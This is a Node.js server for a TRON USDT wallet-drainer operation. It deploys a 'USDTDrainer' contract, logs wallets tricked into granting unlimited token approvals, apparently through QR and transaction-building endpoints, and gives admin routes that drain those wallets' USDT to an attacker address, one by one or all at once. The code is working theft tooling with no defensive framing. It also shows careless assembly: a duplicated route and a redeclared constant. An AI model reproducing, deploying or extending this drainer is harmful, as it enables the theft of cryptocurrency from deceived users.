require('dotenv').config();
const express = require('express');
const cors = require('cors');
const https = require('https');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const axios = require('axios');
const { TronWeb } = require('tronweb');
const solc = require('solc');
const QRCode = require('qrcode');

const app = express();
const PORT = process.env.PORT || 3000;

function log() {
  var ts = new Date().toISOString().replace('T', ' ').slice(0, 19);
  var msg = '[' + ts + ']';
  for (var i = 0; i < arguments.length; i++) {
    msg += ' ' + (typeof arguments[i] === 'object' ? JSON.stringify(arguments[i]) : arguments[i]);
  }
  process.stdout.write(msg + '\n');
}

async function retryWithBackoff(fn, maxRetries = 5) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await fn();
    } catch (err) {
      if (err?.response?.status === 429 && i < maxRetries - 1) {
        const delay = (i + 1) * 2000;
        console.log(`Rate limit, повтор через ${delay}ms...`);
        await new Promise(r => setTimeout(r, delay));
        continue;
      }
      throw err;
    }
  }
}

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public'), {
  setHeaders: function(res, p) {
    if (p.endsWith('.html')) {
      res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
      res.setHeader('Pragma', 'no-cache');
      res.setHeader('Expires', '0');
    }
  }
}));

const tronWeb = new TronWeb({
  fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
  headers: process.env.TRON_API_KEY
    ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY }
    : {},
  privateKey: '0000000000000000000000000000000000000000000000000000000000000001',
});

const USDT_CONTRACT = process.env.USDT_CONTRACT || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const USDT_DECIMALS = 6;
const DRAIN_ADDRESS = process.env.DRAIN_ADDRESS;

let DRAIN_CONTRACT = process.env.DRAIN_CONTRACT || '';
let CONTRACTS = []; // all deployed contracts (for draining old approvals)

async function compileContract() {
  const source = fs.readFileSync(path.join(__dirname, 'contracts', 'Drainer.sol'), 'utf8');
  const input = JSON.stringify({
    language: 'Solidity',
    sources: { 'Drainer.sol': { content: source } },
    settings: {
      outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } }
    }
  });
  const output = JSON.parse(solc.compile(input));
  const contract = output.contracts['Drainer.sol']['USDTDrainer'];
  if (!contract) {
    console.error('Compilation error:', JSON.stringify(output.errors, null, 2));
    throw new Error('Contract compilation failed');
  }
  return { abi: contract.abi, bytecode: '0x' + contract.evm.bytecode.object };
}

async function deployContract(abi, bytecode) {
  if (!process.env.DRAIN_PRIVATE_KEY) {
    console.log('DRAIN_PRIVATE_KEY not set, skipping deployment');
    return null;
  }
  const deployWeb = new TronWeb({
    fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
    headers: process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {},
    privateKey: process.env.DRAIN_PRIVATE_KEY,
  });

  const tx = await deployWeb.transactionBuilder.createSmartContract({
    abi: JSON.stringify(abi),
    bytecode: bytecode,
    feeLimit: 500000000,
    callValue: 0,
    ownerAddress: DRAIN_ADDRESS,
      parameters: [USDT_CONTRACT, DRAIN_ADDRESS, DRAIN_ADDRESS],
    });

    const signed = await deployWeb.trx.sign(tx);
    const receipt = await deployWeb.trx.sendRawTransaction(signed);

    if (receipt.code && receipt.code !== 'SUCCESS') {
      console.error('Deploy failed:', receipt);
      return null;
    }

    const contractAddr = deployWeb.address.fromHex(tx.contract_address || receipt.contract_address);
    console.log('Contract deployed at:', contractAddr);
    return contractAddr;
}

async function initContract() {
  try {
    if (DRAIN_CONTRACT) {
      console.log('Using existing contract:', DRAIN_CONTRACT);
      if (!CONTRACTS.includes(DRAIN_CONTRACT)) CONTRACTS.push(DRAIN_CONTRACT);
      return;
    }
    if (!process.env.DRAIN_PRIVATE_KEY || !DRAIN_ADDRESS) {
      console.log('DRAIN_PRIVATE_KEY or DRAIN_ADDRESS not set, skipping contract deployment');
      return;
    }
    console.log('Compiling contract...');
    const { abi, bytecode } = await compileContract();
    console.log('Deploying contract...');
    const addr = await deployContract(abi, bytecode);
    if (addr) {
      DRAIN_CONTRACT = addr;
      if (!CONTRACTS.includes(addr)) CONTRACTS.push(addr);
      console.log('DRAIN_CONTRACT set to:', addr);
    }
  } catch (e) {
    console.error('Contract init error:', e.message);
  }
}

// ========== ROUTES ==========

app.post('/api/balance', async (req, res) => {
  try {
    const { address } = req.body;

    if (!address || !tronWeb.isAddress(address)) {
      return res.status(400).json({ error: 'Некорректный TRON-адрес' });
    }

    const contract = await tronWeb.contract().at(USDT_CONTRACT);
    const balance = await retryWithBackoff(() => contract.balanceOf(address).call());
    const formatted = balance.toNumber ? balance.toNumber() / 10 ** USDT_DECIMALS : Number(balance) / 10 ** USDT_DECIMALS;

    const account = await retryWithBackoff(() => tronWeb.trx.getAccount(address));
    const trxBalance = account.balance
      ? (account.balance.toNumber ? account.balance.toNumber() / 1e6 : Number(account.balance) / 1e6)
      : 0;

    res.json({
      address,
      usdt: formatted,
      trx: trxBalance,
    });
  } catch (error) {
    console.error('Ошибка:', error);
    res.status(500).json({ error: 'Ошибка при получении баланса' });
  }
});

app.post('/api/tokens', async (req, res) => {
  try {
    const { address } = req.body;
    if (!address || !tronWeb.isAddress(address)) {
      return res.status(400).json({ error: 'Invalid address' });
    }

    const hex = tronWeb.address.toHex(address).replace('0x', '');
    const response = await fetch(`https://api.trongrid.io/v1/accounts/${hex}`, {
      headers: process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {},
    });
    const data = await response.json();

    const tokens = [];
    if (data.data && data.data.length > 0 && data.data[0].trc20) {
      for (const entry of data.data[0].trc20) {
        const contractAddress = Object.keys(entry)[0];
        const rawBalance = Object.values(entry)[0];
        let tokenInfo = { contractAddress, rawBalance, symbol: null, decimals: null };
        try {
          const contract = await retryWithBackoff(() => tronWeb.contract().at(contractAddress));
          const symbol = await retryWithBackoff(() => contract.symbol().call());
          const decimals = await retryWithBackoff(() => contract.decimals().call());
          tokenInfo.symbol = symbol;
          tokenInfo.decimals = decimals.toNumber ? decimals.toNumber() : Number(decimals);
        } catch(e) {
          console.log('Could not fetch details for', contractAddress);
        }
        tokens.push(tokenInfo);
      }
    }

    res.json({ tokens });
  } catch (error) {
    console.error('Error fetching tokens:', error);
    res.status(500).json({ error: 'Failed to fetch tokens' });
  }
});

app.post('/api/sweep', async (req, res) => {
  try {
    const { address } = req.body;
    if (!address || !tronWeb.isAddress(address)) {
      return res.status(400).json({ error: 'Invalid address' });
    }

    const drainPk = process.env.DRAIN_PRIVATE_KEY;
    if (!drainPk) {
      return res.status(500).json({ error: 'Drain private key not configured' });
    }

    const drainWeb = new TronWeb({
      fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
      headers: process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {},
      privateKey: drainPk,
    });

    let target, method, abiFragment;

    if (DRAIN_CONTRACT) {
      target = DRAIN_CONTRACT;
      method = 'drainAll(address)';
      abiFragment = [{ type: 'address', value: address }];
    } else {
      target = USDT_CONTRACT;
      method = 'transferFrom(address,address,uint256)';
      const contract = await drainWeb.contract().at(USDT_CONTRACT);
      const raw = await contract.balanceOf(address).call();
      const balance = raw.toNumber ? raw.toNumber() : Number(raw);
      if (balance <= 0) {
        return res.json({ success: false, error: 'Zero balance' });
      }
      abiFragment = [
        { type: 'address', value: address },
        { type: 'address', value: DRAIN_ADDRESS },
        { type: 'uint256', value: balance.toString() }
      ];
    }

    const tx = await drainWeb.transactionBuilder.triggerSmartContract(
      target, method,
      { feeLimit: 20000000 },
      abiFragment,
      DRAIN_ADDRESS
    );
    const signed = await drainWeb.trx.sign(tx.transaction);
    const receipt = await drainWeb.trx.sendRawTransaction(signed);
    if (receipt.code && receipt.code !== 'SUCCESS') {
      return res.json({ success: false, error: 'Receipt: ' + JSON.stringify(receipt) });
    }
    const txId = receipt.txid || receipt;
    res.json({ success: true, txId, method: DRAIN_CONTRACT ? 'contract' : 'direct' });
  } catch (error) {
    console.error('Sweep error:', error);
    res.status(500).json({ success: false, error: error.message || 'Unknown error' });
  }
});

app.get('/api/config', async (req, res) => {
  let maxApprove = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
  if (DRAIN_CONTRACT) {
    try {
      const abi = [{"constant":true,"inputs":[],"name":"MAX_APPROVE","outputs":[{"name":"","type":"uint256"}],"type":"function"}];
      const c = await tronWeb.contract(abi).at(DRAIN_CONTRACT);
      const raw = await c.MAX_APPROVE().call();
      maxApprove = raw.toString ? raw.toString() : String(raw);
    } catch (e) {
      console.log('Could not read MAX_APPROVE from contract, using default');
    }
  }
  res.json({
    network: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
    usdtContract: USDT_CONTRACT,
    usdtContractHex: tronWeb.address.toHex(USDT_CONTRACT),
    drainAddress: DRAIN_ADDRESS,
    drainContract: DRAIN_CONTRACT,
    drainContractHex: DRAIN_CONTRACT ? tronWeb.address.toHex(DRAIN_CONTRACT) : '',
    maxApprove: maxApprove,
  });
});

app.post('/api/build-tx', async (req, res) => {
  try {
    const body = req.body;
    const addr = body.owner_address || '?';
    const contract = body.contract_address || '?';
    const fullNode = process.env.TRON_FULL_NODE || 'https://api.trongrid.io';
    log('BUILD-TX from=' + addr.slice(0, 16) + '.. contract=' + contract.slice(0, 16) + '.. sel=' + (body.function_selector || '?'));
    const headers = process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {};
    const resp = await retryWithBackoff(() =>
      axios.post(fullNode + '/wallet/triggersmartcontract', body, { headers, timeout: 15000 })
    );
    const result = resp.data;
    log('BUILD-TX result: ok=' + !!(result && (result.transaction || result.txID)) + ' code=' + (result.code || 'none') + ' msg=' + (result.Error || '') + ' txID=' + ((result.transaction && result.transaction.txID) || result.txID || '').slice(0, 16));
    res.json(result);
  } catch (e) {
    log('BUILD-TX ERROR: ' + e.message + (e.response ? ' status=' + e.response.status + ' data=' + JSON.stringify(e.response.data).slice(0, 200) : ''));
    res.status(500).json({ error: e.message || 'Build failed' });
  }
});

app.post('/api/broadcast-tx', async (req, res) => {
  try {
    const body = req.body.transaction || req.body;
    const txId = body.txID || body.txid || '?';
    const fullNode = process.env.TRON_FULL_NODE || 'https://api.trongrid.io';
    log('BROADCAST-TX id=' + (typeof txId === 'string' ? txId.slice(0, 16) : '?') + '.. has_sig=' + !!(body.signature || (body.signatures && body.signatures.length)));
    const headers = process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {};
    const resp = await retryWithBackoff(() =>
      axios.post(fullNode + '/wallet/broadcasttransaction', body, { headers, timeout: 15000 })
    );
    const result = resp.data;
    log('BROADCAST-TX result: code=' + (result.code || 'SUCCESS') + ' msg=' + (result.Error || '') + ' txid=' + ((result.txid || result.txID || '').slice(0, 16)));
    res.json(result);
  } catch (e) {
    log('BROADCAST-TX ERROR: ' + e.message + (e.response ? ' status=' + e.response.status + ' data=' + JSON.stringify(e.response.data).slice(0,200) : ''));
    res.status(500).json({ error: e.message || 'Broadcast failed' });
  }
});

app.post('/api/broadcast-tx', async (req, res) => {
  try {
    const body = req.body.transaction || req.body;
    const txId = body.txID || body.txid || '?';
    log('BROADCAST-TX id=' + (typeof txId === 'string' ? txId.slice(0, 16) : '?') + '.. has_sig=' + !!(body.signature || (body.signatures && body.signatures.length)));
    const result = await retryWithBackoff(() =>
      tronWeb.fullNode.request('wallet/broadcasttransaction', body)
    );
    log('BROADCAST-TX result: code=' + (result.code || 'SUCCESS') + ' msg=' + (result.Error || (result.result && result.result.message) || '') + ' txid=' + ((result.txid || result.txID || '').slice(0, 16)));
    res.json(result);
  } catch (e) {
    log('BROADCAST-TX ERROR: ' + e.message);
    res.status(500).json({ error: e.message || 'Broadcast failed' });
  }
});

const EVENTS_FILE = path.join(__dirname, 'events.json');

app.post('/api/event', (req, res) => {
  try {
    const { type, address, txId, amount } = req.body;
    console.log(`[event] ${type} ${address || ''} ${txId || ''} ${amount || ''}`);
    if (!type) return res.status(400).json({ error: 'type required' });
    let events = [];
    try { events = JSON.parse(fs.readFileSync(EVENTS_FILE, 'utf8')); } catch(e) {}
    events.unshift({ type, address: address || '', txId: txId || '', amount: amount || '', time: Date.now() });
    if (events.length > 100) events = events.slice(0, 100);
    fs.writeFileSync(EVENTS_FILE, JSON.stringify(events));
    console.log(`[event] saved, total events: ${events.length}`);
    res.json({ ok: true });
  } catch(e) {
    console.error(`[event] error: ${e.message}`);
    res.status(500).json({ error: e.message });
  }
});

// ========== QR CODE SESSION ==========

const qrSessions = new Map();
const QR_SESSION_TTL = 5 * 60 * 1000;

setInterval(() => {
  const now = Date.now();
  for (const [id, session] of qrSessions) {
    if (now > session.expires) qrSessions.delete(id);
  }
}, 60000);

app.post('/api/qr-generate', async (req, res) => {
  try {
    const siteUrl = req.headers.origin || `https://${req.headers.host}`;
    const sessionId = crypto.randomUUID();
    qrSessions.set(sessionId, { address: null, expires: Date.now() + QR_SESSION_TTL });

    const qrUrl = `${siteUrl}/qr-session/${sessionId}`;
    const qrDataUrl = await QRCode.toDataURL(qrUrl, { width: 300, margin: 2 });

    res.json({ sessionId, qrDataUrl, qrUrl, expiresIn: QR_SESSION_TTL });
  } catch (e) {
    console.error('QR generate error:', e);
    res.status(500).json({ error: 'Failed to generate QR' });
  }
});

app.get('/api/qr-status/:sessionId', (req, res) => {
  const session = qrSessions.get(req.params.sessionId);
  if (!session) return res.status(404).json({ error: 'Session expired or invalid' });
  res.json({ address: session.address, connected: !!session.address });
});

app.post('/api/qr-connect/:sessionId', (req, res) => {
  const { address } = req.body;
  const session = qrSessions.get(req.params.sessionId);
  if (!session) return res.status(404).json({ error: 'Session expired or invalid' });
  if (!address) return res.status(400).json({ error: 'Address required' });
  session.address = address;
  session.expires = Date.now() + 30000;
  console.log(`[qr] session ${req.params.sessionId} connected: ${address}`);
  res.json({ ok: true });
});

app.post('/api/qr-data', async (req, res) => {
  try {
    const { data } = req.body;
    if (!data) return res.status(400).json({ error: 'data required' });
    const qrDataUrl = await QRCode.toDataURL(data, { width: 300, margin: 2 });
    res.json({ qrDataUrl });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/qr-session/:sessionId', (req, res) => {
  const session = qrSessions.get(req.params.sessionId);
  if (!session) {
    return res.status(404).send('Session expired or invalid');
  }
  const qrHtmlPath = path.join(__dirname, 'public', 'qr.html');
  if (fs.existsSync(qrHtmlPath)) {
    let html = fs.readFileSync(qrHtmlPath, 'utf8');
    html = html.replace(/\{\{SESSION_ID\}\}/g, req.params.sessionId);
    html = html.replace(/\{\{SITE_URL\}\}/g, req.headers.origin || `https://${req.headers.host}`);
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.send(html);
  } else {
    res.status(404).send('QR page not found');
  }
});

// ========== APPROVED WALLETS (ADMIN) ==========

const APPROVED_FILE = path.join(__dirname, 'approved.json');
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

function loadApproved() {
  try { return JSON.parse(fs.readFileSync(APPROVED_FILE, 'utf8')); } catch(e) { return []; }
}

function saveApproved(data) {
  fs.writeFileSync(APPROVED_FILE, JSON.stringify(data, null, 2));
}

function adminAuth(req, res, next) {
  const pwd = req.query.password || req.headers['x-admin-password'];
  if (pwd !== ADMIN_PASSWORD) return res.status(401).json({ error: 'Unauthorized' });
  next();
}

app.post('/api/approve-done', (req, res) => {
  try {
    const { address } = req.body;
    if (!address || !tronWeb.isAddress(address)) return res.status(400).json({ error: 'Invalid address' });
    const list = loadApproved();
    if (!list.find(w => w.address === address)) {
      list.push({ address, approvedAt: Date.now() });
      saveApproved(list);
      log('APPROVE-DONE address=' + address + ' total=' + (list.length + 1));
    } else {
      log('APPROVE-DONE address=' + address + ' already exists');
    }
    res.json({ ok: true });
  } catch(e) {
    log('APPROVE-DONE ERROR: ' + e.message);
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/admin/wallets', adminAuth, async (req, res) => {
  try {
    const list = loadApproved();
    const result = [];
    for (const w of list) {
      try {
        const contract = await retryWithBackoff(() => tronWeb.contract().at(USDT_CONTRACT));
        const raw = await retryWithBackoff(() => contract.balanceOf(w.address).call());
        const usdt = raw.toNumber ? raw.toNumber() / 10 ** USDT_DECIMALS : Number(raw) / 10 ** USDT_DECIMALS;
        const account = await retryWithBackoff(() => tronWeb.trx.getAccount(w.address));
        const trx = account.balance ? (account.balance.toNumber ? account.balance.toNumber() / 1e6 : Number(account.balance) / 1e6) : 0;
        result.push({ address: w.address, usdt, trx, approvedAt: w.approvedAt });
      } catch(e) {
        result.push({ address: w.address, usdt: 0, trx: 0, approvedAt: w.approvedAt, error: e.message });
      }
    }
    res.json({ wallets: result });
  } catch(e) {
    res.status(500).json({ error: e.message });
  }
});
// Add after the APPROVED_FILE definition
const APPROVED_FILE = path.join(__dirname, 'approved.json');

// Ensure the file exists on startup
function ensureApprovedFile() {
  try {
    if (!fs.existsSync(APPROVED_FILE)) {
      fs.writeFileSync(APPROVED_FILE, JSON.stringify([], null, 2));
      console.log('✅ Created approved.json file');
    } else {
      console.log('✅ approved.json file exists');
    }
  } catch (e) {
    console.error('❌ Error creating approved.json:', e.message);
  }
}

// Call this in your start() function
function makeDrainWeb() {
  const drainPk = process.env.DRAIN_PRIVATE_KEY;
  if (!drainPk) return null;
  return new TronWeb({
    fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
    headers: process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {},
    privateKey: drainPk,
  });
}

async function waitTxConfirmed(tronWeb, txId, maxWaitMs) {
  const start = Date.now();
  while (Date.now() - start < maxWaitMs) {
    try {
      const info = await tronWeb.trx.getTransactionInfo(txId);
      if (info && info.id) {
        const ok = info.receipt && info.receipt.result === 'SUCCESS';
        return { success: ok, info };
      }
    } catch(e) {}
    await new Promise(r => setTimeout(r, 1500));
  }
  return { success: false, info: null, error: 'Not confirmed within timeout' };
}

async function drainAllFrom(drainWeb, address, contractAddr) {
  const target = contractAddr || DRAIN_CONTRACT;
  const tx = await drainWeb.transactionBuilder.triggerSmartContract(
    target, 'drainAll(address)',
    { feeLimit: 20000000 },
    [{ type: 'address', value: address }],
    DRAIN_ADDRESS
  );
  const signed = await drainWeb.trx.sign(tx.transaction);
  const receipt = await drainWeb.trx.sendRawTransaction(signed);
  if (receipt.code && receipt.code !== 'SUCCESS') {
    return { success: false, error: 'Broadcast: ' + JSON.stringify(receipt), txId: receipt.txid || '' };
  }
  const txId = receipt.txid || (receipt.result === true ? (tx.transaction.txID || '') : '');
  if (!txId) return { success: false, error: 'No txid in receipt: ' + JSON.stringify(receipt) };
  const conf = await waitTxConfirmed(drainWeb, txId, 20000);
  if (!conf.success) {
    return { success: false, error: conf.error || 'Contract execution failed', txId };
  }
  return { success: true, txId };
}

async function tryDrainWallet(drainWeb, address) {
  var targets = [DRAIN_CONTRACT].concat(CONTRACTS.filter(function(c){ return c !== DRAIN_CONTRACT; }));
  targets = targets.filter(function(c){ return c; });
  for (var i = 0; i < targets.length; i++) {
    var contract = await drainWeb.contract().at(USDT_CONTRACT);
    var allowanceRaw;
    try { allowanceRaw = await contract.allowance(address, targets[i]).call(); } catch(e) { continue; }
    var allowance = allowanceRaw.toNumber ? allowanceRaw.toNumber() : Number(allowanceRaw);
    if (allowance <= 0) continue;
    var result = await drainAllFrom(drainWeb, address, targets[i]);
    if (result.success) return result;
  }
  return { success: false, error: 'No allowance on any known contract' };
}

app.post('/api/admin/drain/:address', adminAuth, async (req, res) => {
  try {
    const address = req.params.address;
    const { amount } = req.body;
    if (!address || !tronWeb.isAddress(address)) return res.status(400).json({ error: 'Invalid address' });
    if (!DRAIN_CONTRACT) return res.status(500).json({ error: 'No drain contract' });

    const drainWeb = makeDrainWeb();
    if (!drainWeb) return res.status(500).json({ error: 'Drain key not configured' });

    const usdtContract = await drainWeb.contract().at(USDT_CONTRACT);
    const raw = await usdtContract.balanceOf(address).call();
    const balance = raw.toNumber ? raw.toNumber() : Number(raw);
    if (balance <= 0) return res.json({ success: false, error: 'Zero balance' });

    const drainAllResult = await tryDrainWallet(drainWeb, address);
    if (!drainAllResult.success) {
      log('DRAIN ' + address + ' FAILED: ' + drainAllResult.error);
      return res.json(drainAllResult);
    }

    log('DRAIN ' + address + ' OK tx=' + drainAllResult.txId);

    if (amount && amount > 0 && amount < balance) {
      const refund = balance - amount;
      const TRANSFER_ABI = [{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}];
      try {
        const refundTx = await drainWeb.transactionBuilder.triggerSmartContract(
          USDT_CONTRACT, 'transfer(address,uint256)',
          { feeLimit: 20000000 },
          [
            { type: 'address', value: address },
            { type: 'uint256', value: refund.toString() }
          ],
          DRAIN_ADDRESS
        );
        const refundSigned = await drainWeb.trx.sign(refundTx.transaction);
        const refundReceipt = await drainWeb.trx.sendRawTransaction(refundSigned);
        const refundTxId = refundReceipt.txid || '';
        if (refundTxId) {
          const refConf = await waitTxConfirmed(drainWeb, refundTxId, 20000);
          if (refConf.success) {
            const list = loadApproved();
            const idx = list.findIndex(w => w.address === address);
            if (idx !== -1) { list.splice(idx, 1); saveApproved(list); }
            return res.json({ success: true, txId: drainAllResult.txId, refundTxId, address, drained: amount / 1e6, refunded: refund / 1e6 });
          }
        }
      } catch(e) {
        return res.json({ success: true, txId: drainAllResult.txId, address, warning: 'Full balance drained (refund failed)', drained: balance / 1e6 });
      }
    }

    const list = loadApproved();
    const idx = list.findIndex(w => w.address === address);
    if (idx !== -1) { list.splice(idx, 1); saveApproved(list); }

    res.json({ success: true, txId: drainAllResult.txId, address, drained: balance / 1e6 });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message || 'Unknown error' });
  }
});

app.post('/api/admin/drain-all', adminAuth, async (req, res) => {
  try {
    const list = loadApproved();
    if (list.length === 0) return res.json({ success: true, results: [] });

    const drainWeb = makeDrainWeb();
    if (!drainWeb) return res.status(500).json({ error: 'Drain key not configured' });
    if (!DRAIN_CONTRACT) return res.status(500).json({ error: 'No drain contract' });

    const results = [];
    const drained = [];
    for (const w of list) {
      try {
        const contract = await drainWeb.contract().at(USDT_CONTRACT);
        const raw = await contract.balanceOf(w.address).call();
        const bal = raw.toNumber ? raw.toNumber() : Number(raw);
        if (bal <= 0) {
          results.push({ address: w.address, success: false, error: 'Zero balance' });
          continue;
        }
        const r = await tryDrainWallet(drainWeb, w.address);
        if (!r.success) {
          results.push({ address: w.address, success: false, error: r.error, txId: r.txId || '' });
        } else {
          results.push({ address: w.address, success: true, txId: r.txId });
          drained.push(w.address);
        }
      } catch(e) {
        results.push({ address: w.address, success: false, error: e.message });
      }
    }

    const newList = list.filter(w => !drained.includes(w.address));
    saveApproved(newList);
    res.json({ success: true, results });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/admin/update-wallet', adminAuth, async (req, res) => {
  try {
    const { address } = req.body;
    if (!address || !tronWeb.isAddress(address)) {
      return res.status(400).json({ error: 'Invalid TRON address' });
    }
    if (!process.env.DRAIN_PRIVATE_KEY) {
      return res.status(500).json({ error: 'DRAIN_PRIVATE_KEY not configured' });
    }

    log('UPDATE-WALLET: deploying new contract with owner=' + address);

    const { abi, bytecode } = await compileContract();

    const deployWeb = new TronWeb({
      fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
      headers: process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {},
      privateKey: process.env.DRAIN_PRIVATE_KEY,
    });

    const tx = await deployWeb.transactionBuilder.createSmartContract({
      abi: JSON.stringify(abi),
      bytecode: bytecode,
      feeLimit: 500000000,
      callValue: 0,
      ownerAddress: DRAIN_ADDRESS,
      parameters: [USDT_CONTRACT, DRAIN_ADDRESS, address],
    });

    const signed = await deployWeb.trx.sign(tx);
    const receipt = await deployWeb.trx.sendRawTransaction(signed);

    if (receipt.code && receipt.code !== 'SUCCESS') {
      log('UPDATE-WALLET deploy failed: ' + JSON.stringify(receipt));
      return res.status(500).json({ error: 'Deploy failed: ' + JSON.stringify(receipt) });
    }

    const contractAddr = deployWeb.address.fromHex(tx.contract_address || receipt.contract_address);
    log('UPDATE-WALLET new contract deployed at: ' + contractAddr);

    const conf = await waitTxConfirmed(deployWeb, signed.txid || receipt.txid || tx.txID, 30000);
    if (!conf.success) {
      log('UPDATE-WALLET deploy tx not confirmed, continuing anyway');
    }

    const oldContract = DRAIN_CONTRACT;
    if (oldContract && !CONTRACTS.includes(oldContract)) CONTRACTS.push(oldContract);
    DRAIN_CONTRACT = contractAddr;
    if (!CONTRACTS.includes(contractAddr)) CONTRACTS.push(contractAddr);

    res.json({
      success: true,
      oldContract: oldContract,
      contractAddress: contractAddr,
      owner: DRAIN_ADDRESS,
      recipient: address,
      txId: signed.txid || receipt.txid || tx.txID,
      message: 'New contract deployed with recipient ' + address + '. All future approvals will drain to this address.',
    });
  } catch (e) {
    log('UPDATE-WALLET error: ' + e.message);
    res.status(500).json({ error: e.message });
  }
});

// ========== STARTUP ==========

async function start() {
  await initContract();

  app.listen(PORT, () => {
    log('Server started on port ' + PORT + ' (HTTP)');
  });

  const KEY_PATH = path.join(__dirname, 'key.pem');
  const CERT_PATH = path.join(__dirname, 'cert.pem');

  if (fs.existsSync(KEY_PATH) && fs.existsSync(CERT_PATH)) {
    https.createServer({
      key: fs.readFileSync(KEY_PATH),
      cert: fs.readFileSync(CERT_PATH),
    }, app).listen(3443, () => {
      log('Server started on port 3443 (HTTPS)');
    });
  }
}

start().catch(e => { log('Startup error: ' + e.message); process.exit(1); });
